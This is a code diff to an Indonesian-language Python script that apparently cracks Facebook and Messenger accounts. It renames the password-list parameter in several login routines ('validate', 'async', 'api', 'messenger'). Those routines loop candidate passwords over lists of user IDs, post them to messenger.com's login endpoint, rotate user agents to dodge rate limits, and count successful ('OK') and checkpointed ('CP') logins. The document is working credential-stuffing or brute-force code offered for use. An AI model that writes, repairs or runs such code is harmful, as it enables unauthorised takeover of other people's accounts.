@@ -1036,20 +1036,21 @@ def passwrd():
 					pwv.append(xpwd)
 			else:pass
 			if 'metod1' in method:
-				pool.submit(_validate_,uid,pasw)
+				pool.submit(_validate_,uid,pwv)
 			elif 'metod2' in method:
-				pool.submit(_async_,uid,pasw)
+				pool.submit(_async_,uid,pwv)
 			elif 'metod3' in method:
-				pool.submit(_api_,uid,pasw)
+				pool.submit(_api_,uid,pwv)
 			elif 'metod4' in method:
-				pool.submit(_messenger_,uid,pasw)
+				pool.submit(_messenger_,uid,pwv)
 			else:
-				pool.submit(_validate_,uid,pasw)
+				pool.submit(_validate_,uid,pwv)
 	print('')
 	cetak(nel('\t    [cyan][bold green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan][white] '))
 	print(f'[•]{H2} OK : {H2}%s '%(ok))
 	print(f'[•]{K2} CP : {K2}%s '%(cp))
 	input(f'[{x} Klik "{m}Enter{x}" Untuk Kembali Kemenu{x}]')
+	clear()
 	pepek()
 #-------------------[ METODE-B-API ]-----------------#
 def crack(idf,pwv):
@@ -1339,12 +1340,12 @@ def rr073(idf,pwv):
 			time.sleep(31)
 	loop+=1
 ###-----[ METODE VALIDATE ]-----###
-def _validate_(uid,pasw):
+def _validate_(uid,pwv):
 	global loop,ok,cp
 	sys.stdout.write(f"\r{P}>>> {str(loop)}/{len(uid2)} OK-:{H}{ok}{P} CP-:{K}{cp}{P}"),
 	sys.stdout.flush()
 	ses = requests.Session()
-	for pw in pasw:
+	for pw in pwv:
 		try:
 			if 'uadia' in uadarimu: ua = uadia[0]
 			else:ua = ugen()
@@ -1370,12 +1371,12 @@ def _validate_(uid,pasw):
 			time.sleep(15)
 	loop+=1
 ###-----[ METODE ASYNC ]-----###
-def _async_(uid,pasw):
+def _async_(uid,pwv):
 	global loop,ok,cp
 	sys.stdout.write(f"\r{P}  - {str(loop)}/{len(uid2)} OK-:{H}{ok}{P} CP-:{K}{cp}{P}"),
 	sys.stdout.flush()
 	ses = requests.Session()
-	for pw in pasw:
+	for pw in pwv:
 		try:
 			if 'uadia' in uadarimu: ua = uadia[0]
 			else:ua = ugen()
@@ -1403,12 +1404,12 @@ def _async_(uid,pasw):
 			time.sleep(15)
 	loop+=1
 ###-----[ METODE API ]-----###
-def _api_(uid,pasw):
+def _api_(uid,pwv):
 	global loop,ok,cp,a2f
 	sys.stdout.write(f"\r{P}  - {str(loop)}/{len(uid2)} OK-:{H}{ok}{P} CP-:{K}{cp}{P} A2F-:{M}{a2f}{P}"),
 	sys.stdout.flush()
 	ses = requests.Session()
-	for pw in pasw:
+	for pw in pwv:
 		try:
 			if 'uadia' in uadarimu: ua = uadia[0]
 			else:ua = api()
@@ -1442,7 +1443,7 @@ def _api_(uid,pasw):
 			time.sleep(15)
 	loop+=1
 ###-----[ METODE MESSENGER ]-----###
-def _messenger_(uid,pasw):
+def _messenger_(uid,pwv):
 	global loop,ok,cp
 	sys.stdout.write(f"\r{P}  - {str(loop)}/{len(uid2)} OK-:{H}{ok}{P} CP-:{K}{cp}{P}"),
 	sys.stdout.flush()
@@ -1491,7 +1492,7 @@ def _messenger_(uid,pasw):
 			headers.update({"Cookie":f"wd=980x1715; dpr=2; _js_datr={datr}"})
 			break
 		except:pass
-	for pw in pasw:
+	for pw in pwv:
 		try:
 			data.update({"pass":"".join(pw)})
 			response = ses.post("https://www.messenger.com/login/password/", data=data, headers=headers, allow_redirects=False)
